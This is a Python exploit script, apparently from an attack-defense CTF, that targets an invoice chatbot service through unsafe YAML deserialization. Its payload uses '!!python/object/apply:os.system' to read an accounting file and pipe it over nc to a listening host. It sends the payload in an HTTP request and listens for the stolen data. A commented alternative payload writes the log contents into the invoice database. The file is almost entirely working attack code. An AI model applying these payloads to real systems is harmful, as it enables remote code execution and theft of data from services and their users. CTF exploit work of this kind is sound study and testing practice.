from subprocess import PIPE, TimeoutExpired, Popen
import json
import requests
import logging

FLAG = 'foo'
VULN_HOST = 'localhost'
USER = '12345'
HOST = 'host.docker.internal'
HOST_PORT = '7777'
VALID_PAYMENT_TYPE = 'cash'
PAYMENT_TYPE_YAML_INOIVCE_INJECTION = f'!!python/object/apply:os.system [cat /InvoiceApp/accounting/foo | nc {HOST} {HOST_PORT} && echo "muhaha {VALID_PAYMENT_TYPE}"]'
# alternatively, you can also execute a python script that will add the content of the file as invoice to the invoices db and then query for the invoice. For example:
# !!python/object/apply:os.system [echo "cash muhaha" && python3 -c "import sys; import hashlib; from datetime import datetime; from utils import invoice_db_helper as h; h.insert_invoice('f', 'pizza', hashlib.md5('enowars'.encode('utf-8')).hexdigest(), datetime.now(), 1, sys.argv[1], True)" "$(cat accounting/outstanding-invoices.log)"]

logger = logging.getLogger(__name__)

def test_invoice_exploit():
    proc = Popen(['nc', '-l', HOST_PORT], stdout=PIPE)
    invoice_yaml_injection()
    try:
        stdout, _ = proc.communicate(timeout=3)
    except TimeoutExpired:
        proc.kill()
        stdout, err = proc.communicate()
        logger.warning(
            f'Waiting and listening to port {HOST_PORT} for exploit flags ran into timeout. stdout: {stdout}, err: {err}')
    logger.info(stdout)
    return stdout

def invoice_yaml_injection():
    payment_payload = {
        'msg': PAYMENT_TYPE_YAML_INOIVCE_INJECTION,
        'state': json.dumps({
            'mode': 'alarm',
            'payment': 'pending'
            })
        }
    call_bot_response(payment_payload)

def call_bot_response(payload):
    cookies = {"session_id": USER}
    try:
        response = requests.get(f"http://{VULN_HOST}:7353/get_bot_response", params=payload, cookies=cookies)
        logger.info(response)
        logger.info(response.text)
    except Exception as e:
        logger.error(f"Could not get_bot_response. Payload: {payload}, Error: {e}")

if __name__ == '__main__':
    # invoice_yaml_injection()
    test_invoice_exploit()